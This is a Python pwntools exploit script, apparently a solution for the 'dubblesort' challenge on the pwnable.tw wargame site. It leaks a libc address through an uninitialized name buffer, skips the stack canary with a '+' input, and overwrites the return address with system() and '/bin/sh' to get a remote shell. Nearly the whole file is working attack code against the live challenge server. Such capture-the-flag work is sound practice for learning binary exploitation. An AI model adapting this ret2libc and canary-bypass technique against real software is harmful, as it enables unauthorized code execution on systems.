# !/bin/python3
from pwn import *
import subprocess
context.arch = "i386"
context.terminal = ["tmux","splitw","-h"]
# context.log_level = "debug"
def get_base_address(pid):
    cmd = f"cat /proc/{pid}/maps"+" | head -1 | awk -F- {'print $1'}"
    # print(cmd)
    addr = subprocess.check_output(cmd,shell=True).decode()
    return int(addr,16)

def get_libc_address(pid):
    cmd = f"cat /proc/{pid}/maps" + " | grep libc_32.so.6 | head -1 | awk -F- {'print $1'}"
    addr = subprocess.check_output(cmd,shell=True).decode()
    return int(addr,16)

def write_name(io, name:bytes) -> bytes:
    io.recvuntil(b"What your name :")
    io.send(name)
    io.recvuntil(b"Hello ")
    s = io.recvuntil(b",").strip(b",")
    return s

def write_nums(io, nums:list):
    io.recvuntil(b"How many numbers do you what to sort :")
    io.sendline(str(len(nums)).encode())
    for i in range(len(nums)):
        io.recvuntil(f"number : ".encode())
        io.sendline(str(nums[i]).encode())
        print(f"sent the {i}th number")

def gdb_script(_bin:ELF, breakpoints=[]):
    main_addr = _bin.address + 0x9c3
    scripts = f"set $base={_bin.address}\n"
    scripts+= f"set $main_addr={main_addr}\n"
    scripts+= f"b *($base+{0xA1D})\n"
    scripts+= f"c\n"
    #scripts+= f"x/32x $esp+0x3c\n"
    # scripts+= f"memory watch $esp+0x3c 32 dword\n"
    scripts+= f"b *($base+{0xAF9})\n"
    # scripts+= f"c\n"
    # scripts+= f"x/32x $esp+0x3c\n"
    return scripts

def leak_libc(io):
    # when leak this of remote libc, should use "a"*25
    # when leak this of local process, should use "a"*29
    base = write_name(io,b"a"*25)
    assert len(base) >= 28
    base = u32(base[25:28].rjust(4,b"\x00")) 
    # print(hex(base))
    base = base - 0x1b0000
    return base

def write_ret_address(io, _bin:ELF, address,args):
    printf_chk = 0xA32 + _bin.address
    main_addr = 0x9C3 + _bin.address
    puts_got = _bin.symbols['puts']
    nums = [0]*(0x60//4) + ['+'] + [address]*8
    for arg in args:
        nums += [arg]
    # print(nums)
    write_nums(io, nums)

DEBUG = False
ip = "chall.pwnable.tw"
port = 10101

def hack(io):
    
    _bin = ELF("./dubblesort")
    libc = ELF("./libc_32.so.6")
    # leak cannary 
    
    if DEBUG:
        _bin.address = get_base_address(pidof(io)[0])
        libc.address = get_libc_address(pidof(io)[0])
        print(f"text at {hex(_bin.address)}")
        print(f"libc at {hex(libc.address)}")

    # gdb.attach(io, gdbscript=gdb_script(_bin))
    #base = leak_base(io)
    #leak_libc(io,_bin)
    libc.address = leak_libc(io)
    print(f"leaked libc at {hex(libc.address)}")
    binshs = libc.search(b"/bin/sh")
    for _ in binshs:
        if _ > libc.symbols['system']:
            binsh_addr = _
            break
    print(f"bin sh at {hex(binsh_addr)}")
    print(f"system at {hex(libc.symbols['system'])}")
    write_ret_address(io, _bin, libc.symbols['system'], [ binsh_addr ]*2)
    # sleep(1)
    #leak_libc(io,_bin)
    #if io.poll() != None:
    #    raise EOFError
    # io.interactive()

if __name__ =="__main__":
    while True:
        try:
            if DEBUG:
                io = process("./dubblesort")
            else:
                io = remote(ip,port)
            hack(io)
            io.interactive()
            break
        except EOFError:
            print("Faied. Restarting...")

    